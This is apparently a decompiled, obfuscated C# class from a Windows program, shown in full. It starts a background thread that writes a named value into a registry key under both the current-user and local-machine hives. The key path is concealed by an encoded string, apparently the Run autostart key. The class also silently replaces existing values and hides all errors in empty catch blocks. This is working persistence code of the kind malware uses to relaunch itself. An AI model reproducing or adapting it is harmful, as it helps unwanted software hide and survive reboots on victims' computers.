using System.Threading;
using Microsoft.Win32;

internal class Class5
{
	private string string_0;

	private Thread thread_0;

	private string string_1;

	private ThreadStart threadStart_0;

	public Class5(string string_2, string string_3)
	{
		threadStart_0 = method_1;
		thread_0 = new Thread(threadStart_0);
		string_1 = string_2;
		string_0 = string_3;
	}

	public void method_0()
	{
		thread_0.Start();
	}

	private void method_1()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(GClass0.smethod_0("~Ńɍ\u035eўՉ\u0655\u0743\u0879३\u0a4a\u0b41\u0c53൏\u0e6c\u0f71ၻᅨቇፍᑰᕶᙳ\u1779ᡢᥧᩏ᭑ᱤᵢṽὫ\u2063ⅸ≝⍯⑻╻♮❩⡫⥘⩑⭷Ɐ"), writable: true);
			if (registryKey.GetValue(string_1) == null)
			{
				registryKey.SetValue(string_1, string_0);
			}
			else if (registryKey.GetValue(string_1) != string_0)
			{
				registryKey.DeleteValue(string_1);
				registryKey.SetValue(string_1, string_0);
			}
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(GClass0.smethod_0("~Ńɍ\u035eўՉ\u0655\u0743\u0879३\u0a4a\u0b41\u0c53൏\u0e6c\u0f71ၻᅨቇፍᑰᕶᙳ\u1779ᡢᥧᩏ᭑ᱤᵢṽὫ\u2063ⅸ≝⍯⑻╻♮❩⡫⥘⩑⭷Ɐ"), writable: true);
			if (registryKey.GetValue(string_1) == null)
			{
				registryKey.SetValue(string_1, string_0);
			}
			else if (registryKey.GetValue(string_1) != string_0)
			{
				registryKey.DeleteValue(string_1);
				registryKey.SetValue(string_1, string_0);
			}
		}
		catch
		{
		}
	}
}
